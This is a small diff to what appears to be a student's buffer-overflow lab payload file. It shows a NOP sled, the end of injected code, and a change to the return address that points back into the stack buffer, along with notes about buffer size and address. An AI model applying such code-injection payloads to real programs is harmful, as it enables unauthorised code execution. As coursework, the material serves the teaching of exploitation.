@@ -15,9 +15,9 @@ c3                   	/* retq */
 90 90 90 90 90 90 90 90
 90 90 90 90 90 90 90 90
 90 90 90 90 90 
-a0 10 40 00 00 00 00 00 /* <address of beginning of buffer> */
+50 2f 78 55 00 00 00 00 /* address of beginning of buffer */
 
- /* questions: */  
- /* - how big is buffer? */ 
+ /* questions: */ 
+ /* - correct how it do rsp and rbp? */  
+ /* - how big is buffer? */
  /* - what is buffer starting address? */ 
- /* - correct how it do rsp and rbp? */ 
